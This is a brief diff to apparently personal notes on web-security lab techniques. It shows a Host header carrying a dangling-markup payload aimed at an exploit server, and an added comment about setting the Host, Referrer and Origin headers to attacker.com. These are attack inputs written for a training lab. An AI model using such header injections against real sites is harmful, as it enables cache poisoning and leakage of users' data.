@@ -55,3 +55,5 @@ Try to use same emails, but use a little different symbols, that can be converte
 ```
 Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
 ```
+
+# The Host, Referrer, and Origin headers are simultaneously changed to attacker.com.
